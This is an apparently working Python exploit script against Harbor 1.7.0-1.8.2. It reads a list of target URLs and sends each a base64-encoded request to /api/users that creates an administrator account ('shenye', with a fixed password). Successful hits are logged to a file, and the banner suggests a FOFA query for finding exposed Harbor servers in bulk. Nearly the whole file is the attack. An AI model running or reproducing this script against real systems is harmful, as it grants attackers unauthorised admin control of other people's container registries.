import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
        print('+------------------------------------------')
        print('+  \033[31m公众号 : 深夜笔记本                                                  \033[0m')
        print('+  \033[31mVersion: Harbor 1.7.0-1.8.2                                       \033[0m')
        print('+  \033[31m使用格式:  python3 poc.py                                           \033[0m')
        print('+  \033[31mVersion: fofa：title="Harbor"                                      \033[0m')
        print('+  \033[31mUrl      >>> http://xxx.xxx.xxx.xxx                                \033[0m')
        print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/api/users"
    # 自己修改base64加密代码
    data = base64.b64decode("eyJ1c2VybmFtZSI6InNoZW55ZSIsImVtYWlsIjoic2hlbnllQHFxLmNvbSIsInJlYWxuYW1lIjoic2hlbnllIiwicGFzc3dvcmQiOiJTaGVuWWUxMiIsImNvbW1lbnQiOiIxIiwiaGFzX2FkbWluX3JvbGUiOnRydWV9")
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/api/users..... \033[0m".format(target_url))
        if response.status_code == 201:
            print("\033[32m[o] 目标 {} 存在漏洞\033[0m".format(target_url))
            print("\033[32m[o] 成功创建账号:shenye 密码:ShenYe12\033[0m".format(target_url))
            f = open('./vul.txt', 'a')
            f.write(vuln_url)
            f.write("成功创建账号:shenye 密码:ShenYe12")
            f.write('\n')

        else:
            print("\033[31m[x] 目标 {} 不存在漏洞\033[0m".format(target_url))

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    with open('url.txt', 'r', encoding='utf-8') as f:
        for i in f.readlines():
            s = i.strip()
            target_url = i
            POC_1(target_url)
